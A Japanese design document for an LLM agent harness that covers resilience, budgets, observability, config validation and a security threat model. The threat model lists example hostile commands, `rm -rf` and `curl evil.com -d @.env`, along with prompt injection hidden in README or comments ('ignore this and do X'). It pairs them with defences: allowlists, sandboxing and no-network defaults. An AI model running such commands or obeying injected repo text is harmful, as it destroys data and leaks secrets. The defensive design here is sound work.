# operations.md — 運用上の考慮事項

> `DESIGN.md` §16（運用上の考慮事項）の詳細。resilience / セキュリティ / 可観測性 / config 検証 / deliverable ライフサイクルを扱う。多くは runtime（Phase 1）の振る舞いだが、一部は `workflow.toml` の設定や core lib の機能。
>
> **注記**: ここに書かれた機構の多く（budget / cost メトリクス / サンドボックス / config 検証の細部 / async テスト / モデル選択 等）は Phase 1 のランタイムの振る舞いで、実コードを書く段階で細部が確定する。「確定」と読める箇所も設計意図であって最終仕様ではない。

---

## 1. 失敗・中断・タイムアウト・予算（resilience & budgets）

### クラッシュ復旧
- runtime がノード途中でクラッシュしても、イベントログ（append-only）は最後に commit されたイベントまで残っている → そこから再開する。
- 未完了ノードは fresh worker で再 spawn する（worker の途中会話・in-flight ツール呼び出しは捨てる）。
- 冪等性:
  - artifact 登録は冪等（同名上書き）。
  - `--worktree` モードなら部分編集は worktree ごと捨てられる。
  - live repo モードでは harness が触ったファイルをイベントログから把握して revert する（§5 参照）。
- `reset` とは別物。`reset` は意図的なやり直し、これはクラッシュからの自動復旧。

### gate のタイムアウト
- `cmd_exit_0` の gate はコマンドがハングしうる（終わらないテスト）→ gate ごとにタイムアウトを設ける。
- デフォルト値があり、`workflow.toml` の gate args で上書き可。例:
  ```toml
  { gate = "cmd_exit_0", args = { cmd = "...", timeout_seconds = 600 } }
  ```
- タイムアウトしたら gate fail（理由「timeout after Ns」）。

### API リトライ
- Anthropic API の 429/5xx はバックオフ付きリトライ（指数バックオフ、上限回数あり）。
- 上限超過は `node_aborted{reason:api_error}` → `on_reject` 方針へ。

### ノードごと予算（loop budget）
- worker が収束せず無限にツールを呼ぶのを防ぐ。
- `workflow.toml` のノードに `budget = { max_tool_calls = N, max_tokens = N, max_wall_seconds = N }`（任意、`[meta].default_budget` から既定）。
- 超過したら `node_aborted{reason:budget}` → `on_reject` 方針（K 回目なら別ノード or 人間にエスカレ）。

### 「詰まった」の自己申告
- worker は今のところ `request-transition`（完了主張）か reject しかできない → `harness stuck "<理由>"` を追加。
- worker がこれを呼ぶと `node_aborted{reason:stuck}` ＋ その理由で人間にエスカレ。
- 質問キューに `kind=escalation` で積まれ、選択肢は「plan に戻す / gate を見直す / 中断 / 自分でやる」等。

### コスト/予算
- worker spawn ＝ トークン ＝ 金。10M ステップ改修 ＝ 大量。
- コストはノード完了時にメトリクスとして記録する:
  - `advance` イベントの payload に optional `metrics = { cost, tokens, tool_calls, wall_seconds }`、
  - もしくはサイドカー `state/<run-id>.metrics.jsonl`。
- `harness status` と `harness stats` でコスト累計を表示。
- `[meta].run_cost_budget`（任意）── run のコストがこれを超えたら人間にエスカレ。

### ノードごとのモデル選択
- trivial なノードは安いモデル（`claude-haiku-4-5-20251001`）、難しいノードは Opus（`claude-opus-4-7`）。
- `workflow.toml` のノードに `model = "..."`（任意、`[meta].default_model` から既定）。

---

## 2. セキュリティ・信頼境界（trust boundary）

### 脅威モデル
- worker は LLM が提案したコマンドを実行する（`cmd_exit_0` gate は harness が走らせる、worker も `run-command` ツールを持ちうる）。
- 脅威:
  - 破壊的操作（`rm -rf`）
  - シークレット流出（`curl evil.com -d @.env`）
  - repo のコンテンツに仕込まれた prompt injection（README やコメントに「無視して X しろ」）
  - 悪意ある skill（remote fetch / hook 作成 / Unicode で命令隠蔽 ── Twitter 調査の 19 capability）

### 防御

**(a) コマンド allowlist（ノードごと）**
- `workflow.toml` のノードに `cmd_allowlist = ["cargo *", "git diff*", ...]`（パターンのリスト）。
- worker の `run-command` ツールは allowlist にマッチするコマンドだけ受け付ける。
- `cmd_exit_0` の gate コマンドは `workflow.toml` に事前宣言されているので暗黙的に allowlist 済み。
- マッチしないコマンドは拒否（理由を worker に返す）。

**(b) サンドボックス**
- worker のファイル操作・コマンド実行は worktree 内で行う（live repo を直接触らせない）。
- worktree の FS 権限を制限する。オプションでコンテナ / firejail。
- harness の tool-call インターセプタが「edit は blast radius 内」「コマンドは allowlist 内」「作業ディレクトリは worktree」を強制 ── これが Claude Code でいう hook（危険コマンド block 等）の役。

**(c) ネットワーク**
- worker とそのコマンドはデフォルト no-network（outbound 拒否）。
- ネットワークが要るコマンド（パッケージインストール等）は `workflow.toml` のノードに `network = true` を明示宣言したノードでのみ許可。

**(d) シークレットの扱い**
- context バンドルは harness が組み立てる ── 既知のシークレットパターンを redact できる / `[meta].secrets_glob` にマッチするファイルは context に入れない。
- ただし **API に送ったものは "out the door"**（Anthropic に渡る）── これは正直に文書化する。
- 推奨: 本番シークレットを repo に置かない / worktree にはテスト用クレデンシャル env を使う。

**(e) 監査ログ**
- イベントログ ＋ transcripts（§3）が監査証跡 ── 走った全コマンド、行った全 edit、評価した全 gate が記録される。

### 注
- runtime 化で Claude Code の hook 隔離を失うので、上記 (a)〜(c) を runtime のループ内 tool-call インターセプタとして実装する必要がある（`DESIGN.md` §10 のトレードオフ）。

---

## 3. 可観測性・デバッグ（observability）

### transcripts
- 各 worker の全会話を `state/<run-id>.transcripts/<node>-<attempt>.jsonl`（or 同等）にログ（イベントログには大きすぎるので別）。
- **各 worker に送った context バンドルも併せてログ**（「skill が不明瞭だった」「spec スライスに X が無かった」が後から見える）。

### gate ログ
- 各 gate 評価を入力（path / cmd / evidence の中身）と結果（pass / fail ＋ 理由）付きでログ。

### コマンドログ
- 走らせたコマンドを stdout / stderr 付きでログ（長いものは truncate、フルはサイドカー）。

### コマンド
- `harness inspect <run-id> [--node X]` ── run のタイムライン / 指定ノードの transcript / 送った context バンドル / gate 結果 を表示。
- `harness replay <run-id>` ── イベントログから状態を re-derive してイベント単位の履歴を表示。
- `harness stats <run-id>` ── ノードごとに: context バンドルのトークン数 / ツール呼び出し数 / 実時間 / コスト / gate reject 回数 ── **「圧倒的圧縮」をこれで*測る***（context サイズが数字で出る）。

### context バンドルのトークン数計測
- context バンドルビルダに組み込む（毎回ログ）。

---

## 4. config 検証（validation）

### `harness validate [--workflow path] [--spec path]`
以下をチェックして全エラーを列挙する ──
- 全 `next` / `branches` / `wait` が実在ノード id を指す
- `[meta].entry` のノードが実在
- 制御外のサイクルが無い（サイクルは `back` / `on_reject` 経由のみ許可、`next` での前方サイクルは禁止 ── or「サイクル許可だが警告」、要確認）
- 全 gate 名が既知のプリミティブで、args が妥当（必須キーがある等）
- 全 `serves` の F-NNN が `spec.toml` に実在
- 参照される全 skill ファイルが実在
- ワークフローが到達可能・停止する（全ノードが終端ノードに到達できる）
- `[meta].mandatory_gates` が全部既知のプリミティブ
- `can_append` ノードが静的に何も違反してない

### 実行タイミング
- `harness start` 時に自動実行（**壊れた config は `start` で落とす、ノード途中で落とさない**）。
- standalone でも実行可。

---

## 5. deliverable のライフサイクルと spec amendment

### 成果物
- run は diff（作業ディレクトリ内、or ブランチ）を生む。
  - **成功時**（review ノード通過）: その diff / ブランチが deliverable。人間がレビューしてマージ。成功した run の成果物（diff / ブランチ）から PR を作りたければ `workflow.toml` の最終ノードに `cmd_exit_0 "gh pr create ..."` を 1 行書けば済む ── harness の機能ではない（ワークフローデータの一部）。
  - **失敗 / 中断時**:
    - worktree を使っていたなら、そのディレクトリを外部で捨てるだけ（live repo に痕跡なし）。worktree の作成 / 破棄 / per-run 隔離は harness が所有しない（後述）。
    - worktree を使っていない（live repo を直接触った）なら、harness が触ったファイルをイベントログから把握できるので revert 対象は分かる ── `git reset --hard` / `git stash`。
  - `harness abandon <run-id>` コマンド（run state を「破棄」とマークする ── ファイルシステム上の worktree の後始末は上記のとおり別）。

### worktree の所有
- worktree の作成・破棄・per-run 隔離は harness が所有しない。`--worktree <path>` は「この run の `cmd_exit_0` と編集の作業ディレクトリをここにする」だけを意味し、worktree 自体の作成 / 破棄はユーザー or 外部ツール（`git worktree` / `C:\ツール\git-worktree-runner` 等）の責任。harness はそのディレクトリ内で動き、触ったファイルをイベントログに記録する。コーディネーターによる fan-out（複数並列ブランチ）も同様 ── ブランチ / worktree の段取りは workflow.toml の `fork` / `join` ＋ 外部ツールで、harness はノードを走らせるだけ。

### spec amendment（途中で要件が変わる）
- spec は承認後 frozen。
- implement 中に「spec が間違ってた」と気づいたら →
  1. spec ノードまで戻る。`harness back` は「1 つ前のノードへ戻る（理由のみ）」であって任意ノードへは飛べない ── なので (a) `on_reject` の `goto` で spec ノードに戻る経路を `workflow.toml` に用意しておく（例: implement ノードの `on_reject = { after = N, goto = "spec" }`）か、(b) `harness back "..."` を必要回数繰り返して spec ノードまで戻る。
  2. spec ノードに到達したら spec status を draft に戻し、壁打ち再開（`harness ask` / `??` で新たな未解決点を立てる）→ 再承認
  3. **既に done な implement 成果物のうち、変わった要件にもう紐づかないものは `traceability_closed` が検出**（orphan、または「この F-NNN にテスト無し」）→ それらのノードも戻される
- amendment は **高くつく**（done な作業を無効化しうる）── これは意図的な摩擦。spec 承認 gate は amendment を稀にするためにある。

---

## 6. 補足（中程度の論点 ── 詳細は実装時）

- **flaky / 不十分なテスト**: known-flaky リスト（再試行する / 人間が「この失敗は accept」で `harness answer` ── `kind=escalation` の質問への回答、§2/§3 参照）。「repo のテストスイートが悪い」は harness が直せない前提 ── 赤なら進めないとしか言えない。
- **長時間テストの非同期化**: 2 時間のフルスイート → CI に push、「test running」状態を記録、人間 / poller が後で確認、gate ＝「commit X の CI が green」。push → poll → async の機構は実装時に詰める。
- **mutation testing を任意 gate に**: `cmd_exit_0 "cargo mutants --fail-on-survived"` で「`assert true` テスト」を殺せる ── 意味のあるテストかは決定論的に検出不能だが下限は引ける。
- **「ビルドが通る」を準ユニバーサルな mandatory exit gate に**: 各ノードの出口に最低限 `cmd_exit_0 "cargo check"` を入れると「ノード 10 で初めてビルド壊れてた発覚」を防げる。`[meta].mandatory_gates` の有力候補。
- **lessons log の肥大化対策**: lessons が無限に増えると読むのに context を食う → 定期的に要約 / キュレート（メタ skillify）、or 上位 N 件の関連 lessons だけ読む。
- **harness 自身のバージョニング**: gate プリミティブ・`workflow.toml` スキーマは進化する → スキーマバージョンを `start` イベントに記録、移行 or 明確なエラーで拒否。
- **マルチ言語 / モノレポ**: CKG は複数索引器、テストコマンドはサブツリーごとに違う、blast radius が言語をまたぐ。`cmd_exit_0` が汎用なので大半は OK だが、CKG マージとサブツリーごとのツール設定（このノードのテストは `cargo test`、あのノードは `pnpm test`）は要設計。

---

## 7. 正直な限界（この章で増える分）

- worker の context に入れたシークレットは API に渡る ── harness は redaction を提供するが完全な保証はできない。
- 意味のあるテストかは決定論的に検出不能（mutation testing で下限は引けるが証明ではない）。
- flaky / 不十分なテストスイートは harness が直せない（赤なら進めない、known-flaky で回避はできるが根本対処ではない）。
- サンドボックスは OS 依存（コンテナ / firejail が無い環境では worktree の FS 権限制限止まり）。
